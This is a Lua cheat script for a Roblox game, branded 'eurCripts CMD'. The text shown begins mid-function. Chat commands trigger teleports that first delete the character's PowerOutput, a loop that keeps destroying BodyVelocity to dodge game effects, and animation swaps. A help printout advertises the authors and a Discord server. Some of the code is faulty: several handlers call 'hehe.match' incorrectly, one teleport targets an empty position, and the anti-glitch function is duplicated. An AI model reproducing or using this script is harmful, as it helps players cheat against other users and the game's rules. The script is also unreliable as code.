if game.Workspace.Live[player.Name].Animate.idle:FindFirstChild("Animation1") then
game.Workspace.Live[player.Name].Animate.idle:FindFirstChild("Animation1").AnimationId = "rbxassetid://1083445855"
if game.Workspace.Live[player.Name].Animate.walk:FindFirstChild("RunAnim") then
game.Workspace.Live[player.Name].Animate.walk:FindFirstChild("RunAnim").AnimationId = "rbxassetid://1083445855"
end end end
end

function vmp2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "Vampire Animation Loaded";
})  
end

Player.Chatted:Connect(function(hehe)
if hehe:match("$vampire") or hehe:match("$evp") then
vmp()
vmp2()
end
end)

function ag2()
if not game:IsLoaded() then
game.Loaded:Wait()
end

local plr = game.Players.LocalPlayer

while wait() do
    pcall(function()
        game:GetService("Workspace").Live[plr.Name].LowerTorso.BodyVelocity:Destroy()
    end)
end
end

function ag()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "AntiGlitch Loaded";
})  
end

Player.Chatted:Connect(function(hehe)
if hehe:match("$antiglitch") or hehe:match("$eag") then
ag2()
ag()
end
end)


function morehelp()
        print("---------------------------------------------------------------------------------------------")
        print("         --------------------- eursCMD created by eur#4932 + Aaron17aYT ---------------------")
        print("                 ------------------------------ V1.1 ------------------------------")
        print("                             -------- https://discord.gg/UBHcMXNkkB --------")
        print("--------------------------------------------------------------------------------------------------------------")
        print("$evp or $evampire = Vampire animation, Bugged in Heaven and sometimes bug in Queue")
        print("---------------------------------------------------------------------------------------------------------------")
        print("$ebs = Beerus Animation")
        print("----------------------------------------------------------------------------------------------------------------")
        print("$meleeeurs or $eurm = Spam Melee Moves")
        print("----------------------------------------------------------------------------------------------------------------")
        print("$fullbright or $fbg = More Ilumination")
        print("----------------------------------------------------------------------------------------------------------------")
        print("$antiglitch or $eag = Anti Glitch, NO IS ANTI GRAB")
        print(" ------------------------ IM EDITING TPS --------------------------------")
        print("$south = Teleport to South City")
        print("----------------------------------------------------------------------------------------------------------------")
        print("$central = Teleport to Central City")
        print("----------------------------------------------------------------------------------------------------------------")
        print("$western = Teleport to Western City")
        print("----------------------------------------------------------------------------------------------------------------")
        print("$tower = Teleport to Tower")
        print("----------------------------------------------------------------------------------------------------------------")           
end

function morehelp2()
        print("")
end
Player.Chatted:Connect(function(hehe)
if hehe:match("$eurs") then
morehelp()
morehelp2()
end
end)

function tps()
local pussy = game.Players.LocalPlayer.Character
pussy.PowerOutput:Destroy()
pussy.HumanoidRootPart.CFrame = CFrame.new(-444, 27, -6393)

end

function tps2()
game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "eurCripts CMD";
            Text = "Teleported";
            Duration = (0.1)
})
end
Player.Chatted:Connect(function(hehe)
if hehe:match("$south") then
tps()
tps2()
end
end)

function tpc()
local pussy = game.Players.LocalPlayer.Character
pussy.PowerOutput:Destroy()
pussy.HumanoidRootPart.CFrame = CFrame.new(-571, 22, -2897)
end

function tpc2()
game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "eurCripts CMD";
            Text = "Teleported";
            Duration = (0.1)
})
end
Player.Chatted:Connect(function(hehe)
if hehe:match("$central") then
tpc()
tpc2()
end
end)

function tpt()
local pussy = game.Players.LocalPlayer.Character
pussy.PowerOutput:Destroy()
pussy.HumanoidRootPart.CFrame = CFrame.new(2752.0346679688, 3944.8598632813, -2270.1870117188)
end

function tpt2()
game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "eurCripts CMD";
            Text = "Teleported";
            Duration = (0.1)
})
end
Player.Chatted:Connect(function(hehe)
if hehe:match("$tower") then
tpt()
tpt2()
end
end)

function tpw()
local pussy = game.Players.LocalPlayer.Character
pussy.PowerOutput:Destroy()
pussy.HumanoidRootPart.CFrame = CFrame.new()
end

function tpw2()
game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "eurCripts CMD";
            Text = "Teleported";
            Duration = (0.1)
})
end
Player.Chatted:Connect(function(hehe)
if hehe:match("$western") then
tpw()
tpw2()
end
end)

function tpj()
local pussy = game.Players.LocalPlayer.Character
pussy.PowerOutput:Destroy()
pussy.HumanoidRootPart.CFrame = CFrame.new(-778, 133, -628)
end

Player.Chatted:Connect(function(hehe)
if hehe.match("$jirenshop") then
tpj()
end
end)

function asd()
if not game:IsLoaded() then
game.Loaded:Wait()
end

local plr = game.Players.LocalPlayer

while wait() do
    pcall(function()
        game:GetService("Workspace").Live[plr.Name].LowerTorso.BodyVelocity:Destroy()
    end)
end
end

function asd2()
game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "eurCripts CMD";
            Text = "AntiGlitch Loaded";
            Duration = (0.1)
})
end
Player.Chatted:Connect(function(hehe)
if hehe:match("$eag") or hehe.match("$antiglitch") then
asd2()
asd()
end
end)
